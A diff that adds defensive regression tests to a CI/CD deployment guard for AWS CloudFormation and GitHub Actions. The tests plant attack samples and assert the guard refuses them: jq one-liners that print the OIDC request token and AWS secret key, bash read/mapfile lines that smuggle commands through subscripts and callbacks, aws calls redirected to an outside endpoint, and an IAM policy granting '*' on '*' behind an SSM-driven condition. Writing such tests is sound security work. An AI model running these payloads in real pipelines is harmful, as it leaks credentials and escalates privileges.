@@ -7804,6 +7804,135 @@ describe('DPW-14 (C11-D76): ASSET_CHECK on planted assemblies', () => {
     }
   }, 120_000)
 
+  // The eighth review's third attack (INPUTS-A3-01). Every workload parameter is an SSM parameter type, whose
+  // Default names a parameter-store entry: CloudFormation deploys the value the entry holds when the stack
+  // deploys, which a stack deployed earlier in the run can write, and the diff shows an added
+  // AWS::SSM::Parameter as one line with no name or value. A release wrote a new entry from Platform, read it in
+  // Services and granted * on * on a condition over it, while the approver read the Default as the value. So a
+  // template holds no Conditions or Mappings, every parameter is SSM-typed and names one of the workload's own
+  // entries, and no brace but {} and Fn::Sub's ${name} stands in a string, so none joins into a dynamic
+  // reference, {{resolve:…}}, which CloudFormation resolves from the store the same way.
+  it('refuses a template that takes a value at deploy time the diff doesn’t show (INPUTS-A3-01)', () => {
+    const HANDS = refused(
+      'a template holds a section, a transform or a resource type a workload synth never writes, which hands CloudFormation a template or a handler the diff and the release check never read',
+    )
+    const TAKES = refused(
+      "a template takes a value at deploy time that the diff doesn't show: a parameter but an SSM-typed one naming one of the workload's own entries, or a brace a string could join into a dynamic reference",
+    )
+    const planted = (change: (template: Record<string, unknown>) => void) => (dir: string) => {
+      edit(named(nonprod(dir), 'Services', '.template.json'), change)
+      rekey(nonprod(dir), 'Services')
+    }
+    const parameters = (template: Record<string, unknown>) => template.Parameters as Record<string, unknown>
+    const resources = (template: Record<string, unknown>) => template.Resources as Record<string, unknown>
+    const ssm = (name: string) => ({ Type: 'AWS::SSM::Parameter::Value<String>', Default: name })
+    const policy = (name: unknown) => ({ Type: 'AWS::IAM::Policy', Properties: { PolicyName: name } })
+    // The re-keyed layout, a Sub over a pseudo-parameter and an attribute, an empty {} and another stage's
+    // entry pass, so each refusal below is its plant's.
+    expect(check(planted(() => {}))).toBe('passed')
+    expect(
+      check(
+        planted(template => {
+          resources(template).Extra = policy({ 'Fn::Sub': [`a-\${AWS::AccountId}-\${Res.Arn}`, {}] })
+          resources(template).Other = policy('x{}y')
+          parameters(template).Restore = ssm('/hearth/restore/security-group/api')
+        }),
+      ),
+    ).toBe('passed')
+    // The attack's own plant: a condition over a new entry, granting * on * while it reads open.
+    expect(
+      check(
+        planted(template => {
+          parameters(template).Exports = ssm('/hearth/nonprod/exports/access')
+          template.Conditions = { ExportsOpen: { 'Fn::Equals': [{ Ref: 'Exports' }, 'open'] } }
+          resources(template).ExportsRead = {
+            Type: 'AWS::IAM::Policy',
+            Properties: {
+              PolicyName: 'exports-read',
+              Roles: ['hearth-nonprod-api-task'],
+              PolicyDocument: {
+                Version: '2012-10-17',
+                Statement: [
+                  {
+                    Effect: 'Allow',
+                    Action: { 'Fn::If': ['ExportsOpen', '*', 's3:GetObject'] },
+                    Resource: { 'Fn::If': ['ExportsOpen', '*', 'x'] },
+                  },
+                ],
+              },
+            },
+          }
+        }),
+      ),
+    ).toBe(HANDS)
+    for (const [section, label] of [
+      ['Conditions', 'a Conditions section'],
+      ['Mappings', 'a Mappings section'],
+    ] as const) {
+      expect(
+        check(
+          planted(template => {
+            template[section] = { X: { 'Fn::Equals': ['a', 'a'] } }
+          }),
+        ),
+        label,
+      ).toBe(HANDS)
+    }
+    for (const [change, label] of [
+      [
+        (template: Record<string, unknown>) => (parameters(template).X = ssm('/hearth/nonprod/exports/access')),
+        'a new entry',
+      ],
+      [
+        (template: Record<string, unknown>) => (parameters(template).X = ssm('/hearth/nonprod/security-group/bastion')),
+        'an entry the stacks only write',
+      ],
+      [
+        (template: Record<string, unknown>) => (parameters(template).X = { Type: 'String', Default: 'open' }),
+        'a plain parameter',
+      ],
+      [
+        (template: Record<string, unknown>) =>
+          (parameters(template).X = { ...ssm('/hearth/organisation/id'), AllowedValues: ['x'] }),
+        'another key',
+      ],
+      [(template: Record<string, unknown>) => (template.Parameters = []), 'parameters that are not an object'],
+      [
+        (template: Record<string, unknown>) => (resources(template).X = policy('{{resolve:ssm:/x}}')),
+        'a dynamic reference',
+      ],
+      [
+        (template: Record<string, unknown>) =>
+          (resources(template).X = policy({ 'Fn::Join': ['', ['{', '{resolve:ssm:/x}', '}']] })),
+        'one joined from braces',
+      ],
+      [
+        (template: Record<string, unknown>) =>
+          (resources(template).X = policy({ 'Fn::Join': ['{', ['', '', 'resolve:ssm:/x}}']] })),
+        'one joined by a brace',
+      ],
+      [
+        (template: Record<string, unknown>) => (resources(template).X = policy({ 'Fn::Sub': `{\${AWS::Region}}` })),
+        'a Sub with a brace round a name',
+      ],
+      [
+        (template: Record<string, unknown>) => (resources(template).X = policy({ 'Fn::Sub': `\${!x}` })),
+        "a Sub's escaped name",
+      ],
+      [
+        (template: Record<string, unknown>) => (resources(template).X = policy(`\${AWS::Region}`)),
+        `a \${name} outside a Sub`,
+      ],
+      [
+        (template: Record<string, unknown>) =>
+          (resources(template).X = { Type: 'AWS::IAM::Policy', Properties: { '{': 'x' } }),
+        'a brace in a key',
+      ],
+    ] as const) {
+      expect(check(planted(change)), label).toBe(TAKES)
+    }
+  }, 120_000)
+
   // Round 5's second attack (COMMANDS-A2-01). The CLI publishes every asset of every stack it deploys,
   // resolves a destination's placeholders before it publishes, and uploads nothing to a key that already
   // holds an object; CloudFormation is handed the object at the template's key. So another stack's asset
@@ -9315,8 +9444,10 @@ describe('Round 8, attack 2: the ways past the allowlist (DPW-07, DPW-10)', () =
   // UsePreviousValue for every parameter the deployed stack already has, so a template's Default, all the
   // approver's diff can show, never deployed: a release added a parameter read by nothing, then changed its
   // Default and made a grant conditional on it. Every deploy line now passes --no-previous-parameters, the one
-  // word on its line that names previous parameters, so each parameter deploys as its template's Default.
-  it('deploys every stack with --no-previous-parameters, so each parameter is the Default the diff shows (INPUTS-A2-01)', () => {
+  // word on its line that names previous parameters, so each parameter deploys from its template's Default
+  // (an SSM-typed one's names the parameter-store entry whose value deploys, which ASSET_CHECK holds to the
+  // workload's own entries: INPUTS-A3-01).
+  it('deploys every stack with --no-previous-parameters, so each parameter deploys from the Default the diff shows (INPUTS-A2-01)', () => {
     const deploys = deployText.split('\n').filter(line => line.includes('"$CDK" deploy'))
     expect(deploys).toHaveLength(10)
     for (const line of deploys) expect(line.match(/previous/gi), line).toEqual(['previous'])
@@ -9496,6 +9627,153 @@ describe('Round 8, attack 2: the ways past the allowlist (DPW-07, DPW-10)', () =
       )
     }
     expect(maskingFindings(workflows)).toEqual([])
+    expect(canonicalTextFindings()).toEqual([])
+  })
+})
+
+describe('Round 8, attack 3: the ways past the allowlist (DPW-07, DPW-10)', () => {
+  const at07 = (where: string, rule: string) => `${DEPLOY}: DPW-07 ${where}: ${rule}`
+  const EVALUATES = 'evaluates as arithmetic, a subscript, an offset, a name or a prompt only what it sets itself'
+  const TOOLS =
+    'hands jq and gh only their held flags and a program written on the line, printf a single-quoted format and a plain -v name, aws only its calls and options, tee only the summary and every other tool only its line as the guard writes it, and reads a file by a redirection only on such a line'
+  const COMMANDS =
+    "runs only the commands CANONICAL_COMMANDS names and the canonical texts' functions, each by a plain word, and hands them no environment of its own: export only on its listed lines, no flag to local or export, set only as -euo pipefail, no assignment before a command but IFS's before read, no wrapper and no variable that chooses what runs or that a rule holds to its one line"
+  const ENV =
+    'hands no jq program env or $ENV, reads no /proc file and expands no AWS_ variable, any of which prints the credentials'
+  const canonical = (name: string, line: number, rule: string, id = 'DPW-10') =>
+    `${GUARD}: ${id} ${name}, line ${line}: ${rule}`
+  const plantAfter = (text: string, anchor: string, added: string) => {
+    expect(text).toContain(`${anchor}\n`)
+    const planted = text.replace(`${anchor}\n`, `${anchor}\n${added}\n`)
+    return { planted, line: planted.split('\n').indexOf(added) + 1 }
+  }
+
+  // FETCH-A3-01: jq's env builtin was refused by words JQ_REACH and QUOTED_ENV read with a - beside them
+  // excluded, but jq names hold no -, so -env.X is env.X negated: negating a string throws an error that prints
+  // it, and try … catch . printed the OIDC request token in slices from CLI_FETCH, and the AWS secret from
+  // AWS_CHECK. A - beside a word of jq's own is now read as the operator it is.
+  it("reads jq's env builtin wherever an operator stands beside it (FETCH-A3-01)", () => {
+    const fetch = plantAfter(
+      CLI_FETCH,
+      'mkdir "$RUNNER_TEMP/aws-cdk"',
+      `jq -rn 'range(0; 4000; 8) as $i | try -env.ACTIONS_ID_TOKEN_REQUEST_TOKEN[$i:$i+8] catch .'`,
+    )
+    expect(canonicalTextFindings({ CLI_FETCH: fetch.planted })).toContain(canonical('CLI_FETCH', fetch.line, TOOLS))
+    const anchor = '  [ "$stage" = restore ] && stage=prod'
+    const check = plantAfter(AWS_CHECK, anchor, `  jq -rn 'try -env.AWS_SECRET_ACCESS_KEY catch .'`)
+    expect(canonicalTextFindings({ AWS_CHECK: check.planted })).toContain(canonical('AWS_CHECK', check.line, TOOLS))
+    for (const program of [
+      'try -env.X catch .',
+      'try -$ENV.X catch .',
+      '{a:1} | .a-env',
+      'try (1-env.X) catch .',
+      'env-1',
+      'try (env.X-1) catch .',
+      'env.X',
+      '- env.X',
+    ]) {
+      expect(canonicalToolLines(`x=$(jq -rn '${program}')`), program).toEqual([0])
+    }
+    // In the run as the job holds it, each of the credentialed jobs' copies.
+    const run = addedBefore(
+      'nonprod',
+      'The pinned CDK CLI',
+      '          mkdir "$RUNNER_TEMP/aws-cdk"\n',
+      "          jq -rn 'try -env.ACTIONS_ID_TOKEN_REQUEST_TOKEN catch .'\n",
+    )
+    expect(maskingFindings(run)).toContain(at07('nonprod (The pinned CDK CLI)', ENV))
+    // A field and a variable of that name are none.
+    for (const program of ['.env', '$env']) {
+      expect(canonicalToolLines(`x=$(jq -rn --arg env 1 '${program}')`), program).toEqual([])
+    }
+    expect(maskingFindings(workflows)).toEqual([])
+    expect(canonicalTextFindings()).toEqual([])
+  })
+
+  // COMMANDS-A3-01: a setter builtin's words were read by NAME_TAKER on the code view only up to its first
+  // redirection, so a subscripted name or mapfile's -C callback after one (read -r x < <(…) 'a[$(…)]') ran a
+  // command, with the deploy role's session, in PROBE. A command's words were also read only up to an & or |,
+  // though >&2, &>x and >|x are redirections bash goes on past, so aws, gh, jq and read were handed words no
+  // hold read. Each setter is now read to its command's end past its redirections, as bash hands it its words.
+  it("reads a command's words to its end, past its redirections (COMMANDS-A3-01)", () => {
+    const anchor = `  mapfile -t TASK_ARNS < <(jq -r '.[]' <<<"$ARNS")`
+    for (const added of [
+      `  read -r PWN < <(echo x) 'a[$(touch "$RUNNER_TEMP/pwn")]'`,
+      `  mapfile < <(echo x) -C 'touch "$RUNNER_TEMP/pwn";:' -c 1 -t IGN`,
+      `  read -r PWN >&2 'a[$(touch "$RUNNER_TEMP/pwn")]' <<<x`,
+      `  read -r PWN &>/dev/null 'a[$(touch "$RUNNER_TEMP/pwn")]' <<<x`,
+      `  mapfile -t IGN >|/dev/null -C 'touch "$RUNNER_TEMP/pwn";:' < <(echo x)`,
+      `  printf </dev/null -v PATH '%s' /tmp`,
+    ]) {
+      const probe = plantAfter(PROBE, anchor, added)
+      expect(canonicalTextFindings({ PROBE: probe.planted }), added).toContain(
+        canonical('PROBE', probe.line, EVALUATES),
+      )
+    }
+    // A name a redirection comes before is still read as the name it is, so PATH is no read's.
+    const path = plantAfter(PROBE, anchor, `  read -r X >&2 PATH <<<x`)
+    expect(canonicalTextFindings({ PROBE: path.planted })).toContain(canonical('PROBE', path.line, COMMANDS))
+    // Each held tool is handed what follows a redirection with an & or a | in it.
+    for (const line of [
+      `x=$(get aws ecr describe-images --repository-name hearth-server >&2 --endpoint-url https://198.51.100.7 --query 'imageDetails[0].imageTags' --output json)`,
+      `x=$(get aws ecr describe-images --repository-name hearth-server 2>&1 --endpoint-url https://198.51.100.7 --output json)`,
+      'gh api "repos/$REPO/deployments" >&2 --input /etc/hostname',
+      'gh api "repos/$REPO/deployments" >|/dev/null --input /etc/hostname',
+      `x=$(jq -rn >&2 'env')`,
+    ]) {
+      expect(canonicalToolLines(line), line).toEqual([0])
+    }
+    // The committed setters and a here-string's or a substitution's redirection pass.
+    for (const text of [
+      `mapfile -t TASK_ARNS < <(jq -r '.[]' <<<"$x")`,
+      'while IFS= read -r name; do :; done <<<"$x"',
+      `IFS=$'\\t' read -r path key <<<"$x"`,
+      'read -r x <<<"$y" 2>/dev/null',
+    ]) {
+      expect(outsideEvaluations(text), text).toEqual([])
+    }
+    expect(shellCommands('read -r x >&2 y <<<z')[0]?.tail).toBe(' -r x >&2 y <<<z')
+    expect(canonicalTextFindings()).toEqual([])
+  })
+
+  // FLOW-A3-01: a for loop over literal words was held safe wherever its name was evaluated, and so was a
+  // local with no value; but arithmetic reads a name's value as an expression in its turn, so $((count)) over
+  // the word revision evaluated $revision, an outside value, and a local REPLY that read filled with no name
+  // given evaluated it too. Where bash evaluates a name as arithmetic, a loop's words must be numbers, and every
+  // name the text evaluates is lower-case, never one bash sets on its own.
+  it('evaluates as arithmetic only names whose every value is a number (FLOW-A3-01)', () => {
+    const definition = `    definition=$(output "$\{kind^}TaskDefinition")`
+    const added = [
+      '    a=(0)',
+      `    revision=$\{definition##*:}`,
+      '    for count in revision; do',
+      '      seen=$((count))',
+      '    done',
+    ].join('\n')
+    const loop = plantAfter(TASKS_OUTPUTS, definition, added)
+    expect(canonicalTextFindings({ TASKS_OUTPUTS: loop.planted })).toContain(
+      canonical('TASKS_OUTPUTS', loop.planted.split('\n').indexOf('      seen=$((count))') + 1, EVALUATES),
+    )
+    for (const [text, line] of [
+      ['a=(0)\nrevision=$1\nfor count in revision; do seen=$((count)); done', 2],
+      ['f() {\n  local REPLY\n  read -r <<<"$1"\n  seen=$((REPLY))\n}', 3],
+      ['f() {\n  local MAPFILE\n  mapfile -t <<<"$1"\n  seen=$((MAPFILE))\n}', 3],
+      ['f() {\n  local _\n  echo "$1"\n  seen=$((_))\n}', 3],
+      ['N=0\nseen=$((N + 1))', 1],
+      [`for count in revision; do echo "$\{a[count]}"; done`, 0],
+      [`for count in revision; do echo "$\{x:count}"; done`, 0],
+    ] as const) {
+      expect(outsideEvaluations(text), text).toContain(line)
+    }
+    // A loop over numbers, a name built from a loop's words, a literal's arithmetic and SECONDS pass.
+    for (const text of [
+      'for i in 1 2 3; do seen=$((i + 1)); done',
+      `for kind in a b; do printf -v "$\{kind^^}_X" %s 1; done`,
+      'n=0\nn=$((n + 1))',
+      'DEADLINE=$((SECONDS + 30 * 60))',
+    ]) {
+      expect(outsideEvaluations(text), text).toEqual([])
+    }
     expect(canonicalTextFindings()).toEqual([])
   })
 })
